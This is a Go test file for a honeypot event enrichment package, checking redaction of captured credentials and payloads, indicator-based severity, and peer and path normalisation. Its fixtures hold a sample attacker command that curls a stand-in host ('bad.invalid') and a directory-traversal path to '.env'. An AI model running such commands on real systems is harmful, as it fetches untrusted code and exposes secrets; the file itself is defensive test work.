package eventintel

import (
	"strings"
	"testing"
	"time"
)

func TestEnrichRedactsCredentialAndPayloadValues(t *testing.T) {
	now := time.Date(2026, 11, 24, 12, 0, 0, 0, time.UTC)
	input := HoneypotEvent{
		DateTime: now.Format(time.RFC3339), RemoteAddr: "203.0.113.9:55221", Protocol: "SSH",
		User: "root", Password: "do-not-store", Command: "whoami && curl http://bad.invalid/x",
		CommandOutput: "private-output", Body: "secret payload", Cookies: "sid=private",
	}
	record := Enrich(input, now, nil)
	if record.Schema != "duckos.beelzebub-av-event.v1" || record.SourceIP != "203.0.113.9" { t.Fatalf("unexpected record: %+v", record) }
	if record.Severity != "HIGH" || len(record.Classifications) == 0 { t.Fatalf("expected high severity labels: %+v", record) }
	encoded := RecordJSON(record)
	for _, secret := range []string{"do-not-store","private-output","secret payload","sid=private","root"} {
		if strings.Contains(encoded, secret) { t.Fatalf("raw sensitive value %q leaked: %s", secret, encoded) }
	}
}
func TestEnrichMatchesBodyIndicatorEvenWhenCommandExists(t *testing.T) {
	input := HoneypotEvent{Protocol:"HTTP",Command:"GET /",Body:"sample-payload"}
	hash := Hash(input.Body)
	record := Enrich(input,time.Now(),map[string]Indicator{hash:{SHA256:hash,Severity:"CRITICAL",Label:"test-family"}})
	if record.Indicator==nil || record.Severity!="CRITICAL" { t.Fatalf("indicator not applied: %+v",record) }
}
func TestNormalizePeerIPv6(t *testing.T) {
	ip,port:=normalizePeer("","", "[2001:db8::5]:4422")
	if ip!="2001:db8::5"||port!="4422" { t.Fatalf("unexpected peer: %q %q",ip,port) }
}
func TestNormalizePathRemovesQueryAndTraversalSegments(t *testing.T) {
	if got:=normalizePath("/wp-admin/../.env?token=secret");got!="/.env" { t.Fatalf("path=%q",got) }
}
